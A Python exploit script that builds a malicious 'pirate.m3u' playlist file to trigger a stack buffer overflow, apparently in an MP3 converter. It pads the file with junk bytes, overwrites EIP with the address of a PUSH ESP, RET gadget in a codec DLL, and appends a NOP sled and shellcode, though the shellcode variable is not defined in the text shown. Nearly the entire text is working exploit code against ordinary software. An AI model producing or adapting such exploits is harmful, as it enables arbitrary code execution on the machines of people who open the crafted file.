#!/usr/bin/env python
#
# Script Name   : easy-rm-sploit4.py
...
#                 in this example using the push return technique.
#
...
file = "pirate.m3u"                             # file we will be creating
junk = "\x41" * 26073                           # junk to insert to file

eip = struct.pack('<L',0x018657f6)	        # PUSH ESP, RET (MSRMCcodec00.dll)
shellcode = "\x90"*50 + buf                     # real shellcode here

junk += eip + shellcode                         # everything to be written
